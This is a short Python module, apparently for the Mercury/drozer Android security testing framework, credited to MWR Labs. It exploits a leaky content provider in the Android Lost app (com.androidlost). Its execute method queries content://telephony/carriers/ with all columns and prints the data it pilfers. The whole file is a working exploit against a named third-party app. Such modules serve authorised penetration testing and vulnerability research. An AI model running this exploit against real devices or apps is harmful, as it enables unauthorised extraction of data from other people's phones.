from merc.lib.modules import Module


class com_androidlost(Module):
    """Description: Exploits leaky content provider incontent://telephony/carriers/ 
Vulnerable App: Android Lost (com.androidlost)
https://play.google.com/store/apps/details?id=com.androidlost
Credit: Henry Hoggard - MWR Labs"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):

        request = {}
        request['Uri'] = "content://telephony/carriers/"
        request['showColumns'] = "true"

        print session.executeCommand("provider", "query", request).getPaddedErrorOrData()
